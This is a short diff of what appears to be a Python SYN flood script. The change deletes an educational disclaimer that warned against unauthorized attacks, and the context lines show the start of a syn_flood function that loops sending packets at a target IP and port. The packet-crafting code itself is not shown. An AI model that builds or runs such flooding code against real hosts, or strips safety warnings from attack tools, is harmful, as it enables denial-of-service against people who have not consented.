@@ -4,13 +4,6 @@ import threading
 import random
 import time
 
-# Educational disclaimer message
-DISCLAIMER = """
-DISCLAIMER: This tool is for educational purposes only.
-Do not use this script to perform unauthorized attacks or testing.
-Use it only in controlled environments where you have explicit permission.
-"""
-
 def syn_flood(target_ip, target_port, packet_rate):
     """Performs a SYN flood attack by sending packets at a specified rate."""
     while True:
